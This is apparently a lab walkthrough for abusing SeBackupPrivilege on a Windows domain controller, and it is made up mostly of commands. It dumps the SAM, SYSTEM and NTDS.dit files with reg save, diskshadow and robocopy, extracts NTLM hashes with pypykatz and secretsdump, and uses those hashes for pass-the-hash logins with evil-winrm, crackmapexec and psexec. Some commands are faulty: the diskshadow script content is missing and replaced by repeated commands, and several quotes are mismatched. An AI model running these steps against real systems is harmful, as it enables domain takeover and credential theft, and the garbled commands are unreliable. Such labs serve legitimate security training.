**Lab Setup (as Administrator)**:

for local user:

### For **Local Users**:

Grant `SeBackupPrivilege` by adding the user to the **Backup Operators** group on the target system.

### For **Domain Users**:

On the **Domain Controller (DC)**:

1. Open **Active Directory Users and Computers**.
2. Right-click the user > **Add to group**.
3. Add to:
    - `Backup Operators`
    - `Remote Management Users` (to allow `evil-winrm` access)

![image](https://github.com/user-attachments/assets/0f221a7f-8673-4fd3-b274-11d441f57334)


 Access the Target via Evil-WinRM

```jsx
 evil-winrm -i 192.168.216.130 -u john-low –p "Test@123”
```

![image](https://github.com/user-attachments/assets/73372389-49c4-4e3a-a2b5-0eb2df6e6b52)

Check user privilege 

![image](https://github.com/user-attachments/assets/536e84dd-6f2b-412d-b54d-2e9f5247d381)


check for User:

```jsx
Get-ADUser -Filter * | Select-Object Name, SamAccountName
```

![image](https://github.com/user-attachments/assets/bf892bb2-5a6c-4a38-b073-3bc330b68aa8)


**Exploiting Privilege on Domain Controller (Method 1)**

## Dump Registry Hives (SAM & SYSTEM)

Once connected via `evil-winrm`:

```jsx
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

![image](https://github.com/user-attachments/assets/fdb38b81-2bef-4db4-9218-7aa945b8e9a5)


Download the Files to Attacker Machine

```jsx
cd Temp
download sam
download system
```

![image](https://github.com/user-attachments/assets/ce0c39d7-0270-4eb5-9d74-ef0fa77b93a3)


## Extract Hashes

Using **Pypykatz**

```jsx
pypykatz registry --sam sam system
```

![image](https://github.com/user-attachments/assets/5597c2fb-35ba-40e8-beb4-8992bf65f56a)


You’ll get output like:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e0375cf8e440aa58a809d57edd78996:

or

Using **secretsdump.py** (from Impacket)

```jsx
[secretsdump.py](http://secretsdump.py/) -system /home/kali/system -sam /home/kali/sam LOCAL
```

![image](https://github.com/user-attachments/assets/a61dea99-8902-45fa-809f-16246a591f3a)


## Use Extracted Hash for Lateral Movement

Option 1: evil-winrm (Pass-the-Hash)

```jsx
evil-winrm -i 192.168.216.130 -u corp\administrator -H "5e0375cf8e440aa58a809d57edd78996"
```

Option 2: crackmapexec

```jsx
crackmapexec smb 192.168.216.130 -u Administrator -H 5e0375cf8e440aa58a809d57edd78996
```

Option 3: [psexec.py](http://psexec.py/) (Impacket)

```jsx
cd ~/impacket

python3 ~/impacket/examples/psexec.py corp.local/Administrator@192.168.216.130 -hashes :5e0375cf8e440aa58a809d57edd78996
```

![image](https://github.com/user-attachments/assets/5369cff1-f7da-4ccd-833a-537251539c2d)


**Exploiting Privilege on Domain Controller (Method 2)**

This method leverages **SeBackupPrivilege** to extract the **NTDS.dit** file (Active Directory database) and the SYSTEM hive to dump password hashes.

---

### Step 1: Prepare `diskshadow` Script

On your **attacker machine**, create a `john.dsh` file with the following content:

```jsx
cd C:\Temp
upload john.dsh
diskshadow /s john.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

![image](https://github.com/user-attachments/assets/a180a8d5-812b-4eaf-b26d-0190f30edb39)


This script tells `diskshadow` to create a shadow copy of the C: drive and mount it as `Z:`.

### Step 2: Upload and Execute the Script on Target

From your `evil-winrm` session:

```jsx
cd C:\Temp
upload john.dsh
diskshadow /s john.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

![image](https://github.com/user-attachments/assets/c2b6c3d1-7cdd-4a5d-b71f-dbb327c809b5)


`robocopy /b` uses **backup mode**, which requires `SeBackupPrivilege`.

### Step 3: Dump SYSTEM Hive and Download Files

```jsx
reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system
```

![image](https://github.com/user-attachments/assets/fdd504f7-23e5-4913-b56a-1f85294abea6)


### Step 4: Extract Hashes Using impacket-secretsdump

On your **attacker machine**:

```jsx
impacket-secretsdump -ntds ntds.dit -system system local
```

![image](https://github.com/user-attachments/assets/785ac784-9abc-4625-9fda-068746c18e00)


This will dump all domain user hashes from the NTDS database.

### Step 5: Reuse Hash (Pass-the-Hash)

Use the dumped NTLM hash of the **Administrator** (or any privileged account) to move laterally or elevate privileges:

### Option 1: evil-winrm

```jsx
evil-winrm -i 192.168.216.130 -u administrator -H "96ad902c01c2a7708efa943ad7313feb
```

Option 2: impacket-psexec

```jsx
impacket-psexec corp/Administrator@192.168.216.130 -hashes aad3b435b51404eeaad3b435b51404ee:96ad902c01c2a7708efa943ad7313feb
```

![image](https://github.com/user-attachments/assets/6c8e5482-4c0d-46a6-8164-aa2bb9b87bce)
